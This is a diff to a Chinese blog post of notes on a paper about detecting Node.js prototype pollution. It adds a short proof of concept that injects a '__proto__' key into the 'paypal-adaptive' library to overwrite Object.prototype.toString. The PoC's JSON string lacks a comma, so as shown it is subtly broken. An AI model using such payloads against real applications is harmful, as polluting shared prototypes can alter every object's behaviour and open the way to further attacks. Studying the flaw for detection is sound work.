@@ -8,6 +8,8 @@ toc: true
 
 JavaScript 是一种非常灵活的动态语言，核心机制之一就是原型链继承，但也引入了原型链污染漏洞。即攻击者通过原型链修改父类（上到 Object 类）的属性，影响所有对象行为。
 
+<!--more-->
+
 ## 论文笔记
 
 **Detecting Node.js Prototype Pollution Vulnerabilities via Object Lookup Analysis (2021)**
@@ -49,7 +51,13 @@ module.exports = Paypal;
 
 调用：`merge(defaultConfig,config)` ，其中 `config` 用户可控，则可以通过这些键访问修改 `defaultConfig` 的原型对象。
 
+PoC
 
+```javascript
+var PayPal = require ('paypal-adaptive');
+var p = new PayPal(JSON.parse('{"__proto__":{"toString":"polluted"},"userId":"foo""password":"bar","signature":"abcd","appId":"1234","sandbox":"1234"}'))
+console.log(({}).toString);
+```
 
 ### 1.OPG
 
